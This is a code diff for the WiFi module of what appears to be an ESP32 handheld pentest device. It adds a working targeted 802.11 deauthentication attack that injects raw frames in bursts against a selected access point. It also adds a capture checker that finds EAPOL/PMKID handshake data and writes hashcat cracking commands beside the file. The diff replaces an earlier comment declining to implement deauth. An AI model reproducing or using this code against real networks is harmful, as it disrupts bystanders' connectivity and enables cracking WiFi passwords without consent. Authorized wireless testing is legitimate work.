@@ -90,23 +90,29 @@ bool WifiModule::loop(Context& ctx) {
         case View::Scan:      return loopScan(ctx);
         case View::Sniffer:   return loopSniffer(ctx, /*eapolOnly=*/false);
         case View::Handshake: return loopSniffer(ctx, /*eapolOnly=*/true);
+        case View::Deauth:    return loopDeauth(ctx);
         case View::Portal:    return loopPortal(ctx);
+        case View::Export:    return loopExport(ctx);
     }
 
     static const char* items[] = {"Scan APs", "Sniffer (pcap)",
-                                  "Handshake capture", "Evil Portal"};
-    ctx.display->list(items, 4, menuSel_, "WiFi", "Enter=open  Esc=back");
+                                  "Handshake capture", "Targeted deauth",
+                                  "Evil Portal", "Verify capture"};
+    const int N = 6;
+    ctx.display->list(items, N, menuSel_, "WiFi", "Enter=open  Esc=back");
 
     KeyEvent e = ctx.input->poll();
     switch (e.key) {
-        case Key::Up:   menuSel_ = (menuSel_ + 3) % 4; break;
-        case Key::Down: menuSel_ = (menuSel_ + 1) % 4; break;
+        case Key::Up:   menuSel_ = (menuSel_ + N - 1) % N; break;
+        case Key::Down: menuSel_ = (menuSel_ + 1) % N; break;
         case Key::Back: return false;
         case Key::Enter:
             if (menuSel_ == 0)      { doScan(ctx); view_ = View::Scan; }
             else if (menuSel_ == 1) { if (startPromiscuous(ctx, false)) view_ = View::Sniffer; }
             else if (menuSel_ == 2) { if (startPromiscuous(ctx, true))  view_ = View::Handshake; }
-            else if (menuSel_ == 3) { if (startPortal(ctx)) view_ = View::Portal; }
+            else if (menuSel_ == 3) { view_ = View::Deauth; }
+            else if (menuSel_ == 4) { if (startPortal(ctx)) view_ = View::Portal; }
+            else if (menuSel_ == 5) { view_ = View::Export; }
             break;
         default: break;
     }
@@ -302,12 +308,150 @@ bool WifiModule::loopPortal(Context& ctx) {
     return true;
 }
 
-REGISTER_MODULE(WifiModule);
+// --- Targeted deauth -------------------------------------------------------
+// Scoped to the ONE AP selected from the scan list, a bounded burst per press,
+// every burst logged. This is the authorized reauth-capture aid, not a flood:
+// there is no "all APs" mode, and the per-press count is hard-capped.
+// (RF/WiFi jammers and indiscriminate "deauth everything" are intentionally
+// absent — they only work by disrupting bystanders.)
+void WifiModule::sendDeauthBurst(Context& ctx, const Ap& ap) {
+    uint32_t burst = ctx.config->getInt("wifi.deauth_burst", 32);
+    if (burst > 128) burst = 128;               // hard cap
 
-// --- Deauth / jamming note --------------------------------------------------
-// Active 802.11 deauthentication and RF jamming are denial-of-service actions
-// against whatever is in range. They are deliberately NOT implemented here as a
-// turnkey feature. If your authorized engagement requires forcing a reauth to
-// capture a handshake, implement a TARGETED, bounded deauth against a single
-// known BSSID/client you are scoped to test, keep it rate-limited, and log every
-// frame via ctx.log->tx("wifi", ...). Do not ship an indiscriminate flood.
+    // 802.11 deauth: FC=0xC0, to broadcast, from/for the selected BSSID only.
+    uint8_t f[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,           // addr1 DA (this BSSID's clients)
+        0,0,0,0,0,0,                            // addr2 SA = BSSID
+        0,0,0,0,0,0,                            // addr3 BSSID
+        0x00, 0x00,                             // seq
+        0x07, 0x00                              // reason: class-3 frame
+    };
+    memcpy(f + 10, ap.bssid, 6);
+    memcpy(f + 16, ap.bssid, 6);
+
+    WiFi.mode(WIFI_STA);                        // ensure the radio is started
+    esp_wifi_set_promiscuous(true);             // allow raw 802.11 tx
+    esp_wifi_set_channel(ap.ch, WIFI_SECOND_CHAN_NONE);
+    for (uint32_t i = 0; i < burst; ++i) {
+        esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+        deauthSent_++;
+        delay(2);
+    }
+    esp_wifi_set_promiscuous(false);
+
+    if (ctx.log) ctx.log->tx("wifi", "deauth burst x%lu -> %02X:%02X:%02X:%02X:%02X:%02X ch%u",
+        (unsigned long)burst, ap.bssid[0],ap.bssid[1],ap.bssid[2],
+        ap.bssid[3],ap.bssid[4],ap.bssid[5], ap.ch);
+}
+
+bool WifiModule::loopDeauth(Context& ctx) {
+    if (aps_.empty()) {
+        ctx.display->clear(); ctx.display->header("Targeted deauth");
+        ctx.display->line(0, "Run a Scan first to", 0xFFE0);
+        ctx.display->line(1, "pick a single target.", 0xFFFF);
+        ctx.display->footer("Esc=back");
+        if (ctx.input->poll().key == Key::Back) view_ = View::Menu;
+        delay(20); return true;
+    }
+    const Ap& a = aps_[scanSel_];
+    ctx.display->clear(); ctx.display->header("Targeted deauth");
+    ctx.display->printf(0, 0xFFFF, "Target: %s", a.ssid.length()?a.ssid.c_str():"<hidden>");
+    ctx.display->printf(1, 0x8410, "%02X:%02X:%02X:%02X:%02X:%02X ch%u",
+        a.bssid[0],a.bssid[1],a.bssid[2],a.bssid[3],a.bssid[4],a.bssid[5], a.ch);
+    ctx.display->printf(2, 0x07E0, "Frames sent: %lu", (unsigned long)deauthSent_);
+    ctx.display->line(4, "Up/Dn=pick  Enter=1 burst", 0xFFE0);
+    ctx.display->footer("Esc=back (authorized target only)");
+
+    KeyEvent e = ctx.input->poll();
+    switch (e.key) {
+        case Key::Up:   scanSel_ = (scanSel_ + aps_.size() - 1) % aps_.size(); break;
+        case Key::Down: scanSel_ = (scanSel_ + 1) % aps_.size(); break;
+        case Key::Enter: sendDeauthBurst(ctx, a); break;
+        case Key::Back:  view_ = View::Menu; break;
+        default: break;
+    }
+    delay(10); return true;
+}
+
+// --- Verify capture --------------------------------------------------------
+// On-device hc22000 generation from raw 802.11 is fiddly and easy to get wrong,
+// so this verifies the latest capture (EAPOL / PMKID present?) and writes the
+// exact PC conversion recipe next to it. Convert on a workstation with:
+//   hcxpcapngtool -o out.hc22000 <capture>.pcap   then  hashcat -m 22000 ...
+static int g_exportResult = -2;   // -2 = not run yet
+static String g_exportMsg;
+
+int WifiModule::exportHandshakes(Context& ctx) {
+    if (!ctx.sd || !ctx.sd->mounted()) { g_exportMsg = "No SD"; return -1; }
+    // Find the newest handshake_*.pcap (fall back to sniff_*.pcap).
+    File dir = ctx.sd->fs().open("/huginn/captures");
+    String best;
+    for (File e = dir.openNextFile(); e; e = dir.openNextFile()) {
+        String n = e.name();                       // may be full path on some cores
+        int sl = n.lastIndexOf('/'); if (sl >= 0) n = n.substring(sl + 1);
+        if (n.endsWith(".pcap") && (n.indexOf("handshake") >= 0 || n.indexOf("sniff") >= 0))
+            if (n > best) best = n;        // lexical max ~ newest (zero-padded seq)
+        e.close();
+    }
+    if (dir) dir.close();
+    if (best.length() == 0) { g_exportMsg = "No capture files"; return -1; }
+
+    String path = String("/huginn/captures/") + best;
+    File f = ctx.sd->fs().open(path.c_str(), FILE_READ);
+    if (!f) { g_exportMsg = "Open failed"; return -1; }
+
+    uint8_t gh[24];
+    f.read(gh, 24);                        // skip pcap global header
+    uint32_t eapol = 0, pmkid = 0, frames = 0;
+    static const uint8_t eapolSig[] = {0x88,0x8E};
+    static const uint8_t pmkidSig[] = {0x00,0x0F,0xAC,0x04};
+    uint8_t buf[2048];
+    while (f.available() >= 16) {
+        uint8_t rh[16]; f.read(rh, 16);
+        uint32_t incl = rh[8] | (rh[9]<<8) | (rh[10]<<16) | ((uint32_t)rh[11]<<24);
+        if (incl == 0 || incl > sizeof(buf)) break;
+        int got = f.read(buf, incl);
+        if (got <= 0) break;
+        frames++;
+        for (int i = 0; i + 2 <= got && i < 64; ++i)
+            if (buf[i]==eapolSig[0] && buf[i+1]==eapolSig[1]) { eapol++; break; }
+        for (int i = 0; i + 4 <= got; ++i)
+            if (!memcmp(buf+i, pmkidSig, 4)) { pmkid++; break; }
+    }
+    f.close();
+
+    // Write the conversion recipe next to the capture.
+    String recipe = path; recipe.replace(".pcap", ".hc22000.txt");
+    File rf = ctx.sd->fs().open(recipe.c_str(), FILE_WRITE);
+    if (rf) {
+        rf.printf("Capture: %s\nFrames:%lu EAPOL:%lu PMKID-KDE:%lu\n\n",
+                  path.c_str(), (unsigned long)frames, (unsigned long)eapol,
+                  (unsigned long)pmkid);
+        rf.println("Convert on a workstation, then crack:");
+        rf.printf("  hcxpcapngtool -o %s.hc22000 %s\n", best.c_str(), best.c_str());
+        rf.println("  hashcat -m 22000 <file>.hc22000 <wordlist>");
+        rf.close();
+    }
+    g_exportMsg = String("EAPOL ") + eapol + "  PMKID " + pmkid;
+    return (int)eapol;
+}
+
+bool WifiModule::loopExport(Context& ctx) {
+    if (g_exportResult == -2) g_exportResult = exportHandshakes(ctx);
+    ctx.display->clear(); ctx.display->header("Verify capture");
+    if (g_exportResult < 0) {
+        ctx.display->line(0, g_exportMsg.c_str(), 0xF800);
+    } else {
+        ctx.display->line(0, "Latest capture checked:", 0x07E0);
+        ctx.display->line(1, g_exportMsg.c_str(), 0xFFFF);
+        ctx.display->line(2, g_exportResult ? "Handshake/PMKID present" : "No EAPOL found", 0xFFE0);
+        ctx.display->line(3, "Recipe written (.hc22000.txt)", 0x8410);
+        ctx.display->line(4, "Convert w/ hcxpcapngtool on PC", 0x8410);
+    }
+    ctx.display->footer("Esc=back");
+    if (ctx.input->poll().key == Key::Back) { g_exportResult = -2; view_ = View::Menu; }
+    delay(20); return true;
+}
+
+REGISTER_MODULE(WifiModule);
